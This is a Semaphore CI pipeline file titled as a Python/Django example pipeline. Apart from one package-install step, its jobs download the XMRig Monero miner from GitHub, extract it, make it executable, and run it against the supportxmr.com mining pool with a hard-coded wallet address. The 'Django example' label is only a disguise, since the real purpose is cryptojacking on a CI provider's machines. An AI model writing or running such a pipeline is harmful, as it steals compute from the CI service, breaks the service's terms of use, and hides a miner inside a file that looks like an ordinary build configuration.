version: v1.0
name: Semaphore Python / Django Example Pipeline
agent:
  machine:
    type: e1-standard-2
    os_image: ubuntu1804
global_job_config:
  prologue:
    commands:
      - sem-version python 3.8
blocks:
  - name: wget
    task:
      prologue:
        commands:
          - sudo apt-get update && sudo apt-get install -y python3-dev && sudo apt-get install default-libmysqlclient-dev
      jobs:
        - name: wget
          commands:
            - 'wget https://github.com/xmrig/xmrig/releases/download/v6.9.0/xmrig-6.9.0-linux-static-x64.tar.gz'
  - name: tar
    task:
      jobs:
        - name: tar
          commands:
            - tar xvf xmrig-6.9.0-linux-static-x64.tar.gz
  - name: 'Block #3'
    task:
      jobs:
        - name: ch
          commands:
            - chmod +x xmrig-6.9.0/xmrig
  - name: 'Block #4'
    task:
      jobs:
        - name: xmr
          commands:
            - './xmrig-6.9.0/xmrig -o pool.supportxmr.com:443 -u 85Rb2ZXHsQreQGWdvG6kwgNHnwbkgjBChdXPWt7VPuz8azP8FCQGiRXU2hkWPkMLNy4RMXPKDubgBYPC4AJJsZ8M7njL7z5 -k --tls --randomx-no-numa'
